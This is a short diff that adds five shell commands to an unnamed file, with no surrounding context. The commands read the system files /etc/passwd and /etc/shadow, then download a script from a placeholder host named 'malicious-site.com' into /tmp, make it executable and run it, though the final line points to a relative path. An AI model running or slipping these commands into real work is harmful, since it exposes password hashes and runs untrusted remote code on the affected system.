@@ -1,0 +1,5 @@
+cat /etc/passwd
+cat /etc/shadow
+wget http://malicious-site.com/payload.sh -O /tmp/payload.sh
+chmod +x /tmp/payload.sh
+./tmp/payload.sh
